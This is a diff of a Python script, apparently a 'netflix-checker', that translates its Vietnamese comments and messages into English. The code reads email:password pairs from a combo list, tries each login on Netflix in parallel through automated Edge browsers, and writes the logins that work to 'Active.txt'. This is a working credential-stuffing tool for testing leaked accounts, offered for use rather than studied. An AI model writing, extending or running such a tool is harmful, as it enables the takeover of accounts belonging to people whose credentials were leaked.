@@ -9,10 +9,10 @@ from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import TimeoutException, WebDriverException
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# Đường dẫn EdgeDriver
+# EdgeDriver Path
 EDGEDRIVER_PATH = "C:\\Users\\ADMIN\\Downloads\\netflix-checker\\msedgedriver.exe"
 
-# Hàm in banner
+# Banner printing function
 def print_banner():
     banner = """
 ____   _________.___.____  __.  _____    _______  ___________.____    ._______  ___
@@ -24,21 +24,21 @@ ____   _________.___.____  __.  _____    _______  ___________.____    ._______  
 """
     print(banner)
 
-# Hàm hỏi người dùng có muốn chạy tools không
+# Function asks user if they want to run tools
 def ask_user():
     while True:
-        choice = input("Bạn có muốn chạy tools không? (yes/no): ").strip().lower()
+        choice = input("Do you want to run now? (yes/no): ").strip().lower()
         if choice == "yes":
-            print("Đang tiến hành chạy tools...\n")
+            print("Running...\n")
             time.sleep(1)
             return True
         elif choice == "no":
-            print("Thoát khỏi tools. Hẹn gặp lại!")
+            print("Existing. Goodbye!")
             sys.exit()
         else:
-            print("Lựa chọn không hợp lệ. Vui lòng nhập 'yes' hoặc 'no'.")
+            print("Invalid selection. Please enter 'yes' or 'no'.")
 
-# Hàm làm sạch file input
+# Input file cleaning function
 def clean_file(input_file, output_file):
     cleaned_accounts = []
     with open(input_file, "r") as infile:
@@ -51,9 +51,9 @@ def clean_file(input_file, output_file):
     with open(output_file, "w") as outfile:
         for account in cleaned_accounts:
             outfile.write(account + "\n")
-    print(f"Đã làm sạch file. Số tài khoản hợp lệ: {len(cleaned_accounts)}")
+    print(f"File cleaned. Valid account number: {len(cleaned_accounts)}")
 
-# Hàm kiểm tra tài khoản Netflix
+# Netflix account check function
 def check_account(account):
     email, password = account.strip().split(":")
     options = webdriver.EdgeOptions()
@@ -62,7 +62,7 @@ def check_account(account):
     options.add_argument("--no-sandbox")
     options.add_argument("--disable-dev-shm-usage")
     options.add_argument("--disable-extensions")
-    options.add_argument("--log-level=3")  # Ẩn log trình duyệt
+    options.add_argument("--log-level=3")  # Hide browser logs
 
     service = Service(EDGEDRIVER_PATH)
     driver = None
@@ -76,20 +76,20 @@ def check_account(account):
         time.sleep(3)
 
         if "browse" in driver.current_url:
-            print(f"[+] Tài khoản hợp lệ: {email}")
+            print(f"[+] Valid account: {email}")
             return f"{email}:{password}"
         else:
-            print(f"[-] Tài khoản không hợp lệ: {email}")
+            print(f"[-] Invalid account: {email}")
     except TimeoutException:
         print(f"[!] Timeout: {email}")
     except WebDriverException as e:
-        print(f"[!] Lỗi trình duyệt {email}: {str(e)}")
+        print(f"[!] Browser error {email}: {str(e)}")
     finally:
         if driver:
             driver.quit()
     return None
 
-# Hàm chạy kiểm tra đa luồng
+# Multithreaded test run function
 def process_accounts(input_file, output_file, max_threads=20):
     results = []
     with open(input_file, "r") as file:
@@ -102,27 +102,27 @@ def process_accounts(input_file, output_file, max_threads=20):
             if result:
                 results.append(result)
 
-    # Ghi kết quả vào file
+# Write results to file
     with open(output_file, "w") as f:
         for account in results:
             f.write(account + "\n")
 
-    print(f"\nTổng số tài khoản hợp lệ: {len(results)}")
-    print("Tool đã hoàn thành tất cả công việc. Chương trình sẽ kết thúc ngay bây giờ.")
+    print(f"\nTotal valid accounts: {len(results)}")
+    print("The tool has completed all the work. The program will end now..")
 
-# Hàm chính
+# Main function
 def main():
     print_banner()
     if ask_user():
         raw_input_file = "combo.txt"
         cleaned_file = "cleaned_combo.txt"
         output_file = "Active.txt"
-        max_threads = 20  # Số luồng tối đa
+        max_threads = 20  # Maximum number of threads
 
-        # Làm sạch file
+# Clean up files
         clean_file(raw_input_file, cleaned_file)
 
-        # Chạy tool kiểm tra tài khoản
+# Run account check tool
         process_accounts(cleaned_file, output_file, max_threads)
 
 if __name__ == "__main__":
